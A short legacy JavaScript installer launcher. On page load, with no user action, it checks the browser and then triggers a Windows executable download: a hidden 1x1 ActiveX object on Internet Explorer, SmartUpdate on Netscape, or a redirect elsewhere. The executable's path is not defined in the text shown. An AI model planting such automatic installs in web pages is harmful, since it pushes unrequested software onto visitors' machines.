var bname=navigator.appName;
var bver=parseInt(navigator.appVersion);

function install() {
        if ( navigator.platform && navigator.platform != 'Win32' ) {
                location.replace('NOTWIN32WARNING.html');
                return;
        }
        if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
                document.write('<object id="gib" width=1 height=1 classid="CLSID:018B7EC3-EECA-11d3-8E71-0000E82C6C0D"   codebase="'+exepath+'"></object>');
        } else if (bname == 'Netscape' && bver >= 4) {
                trigger = netscape.softupdate.Trigger;
                if (trigger.UpdateEnabled) {
                        trigger.StartSoftwareUpdate(exepath, trigger.DEFAULT_MODE)
                } else {
                        location.replace(exepath);
                }
        } else {
                location.replace(exepath);
        }
}

install();
